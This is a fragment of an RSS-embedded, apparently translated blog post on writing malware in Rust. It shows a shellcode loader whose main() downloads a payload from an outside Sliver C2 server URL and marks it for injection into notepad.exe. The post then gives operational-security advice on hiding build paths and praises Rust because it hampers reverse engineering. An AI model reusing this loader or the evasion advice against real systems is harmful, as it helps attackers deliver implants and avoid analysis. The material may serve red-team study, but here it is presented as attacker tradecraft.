&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;http_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sliver.nrcerne.com:8444/DULL_EQUIPMENT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http_client&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;get_payload_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 注入notepad.exe进程
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;操作安全考虑&#34;&gt;操作安全考虑
&lt;/h2&gt;&lt;p&gt;Rust会在二进制文件中包含绝对路径(用于调试)，因此需在匿名环境中编译以保护操作安全。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Rust是C/C++开发恶意软件的优秀替代方案。虽然Ghidra 11.0在反编译Rust二进制文件方面取得进步，但由于函数内联和编译优化，分析Rust程序仍然困难。更大的二进制文件也增加了分析时间成本。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bishopfox/rust-malware-example&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整代码示例可在GitHub获取&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
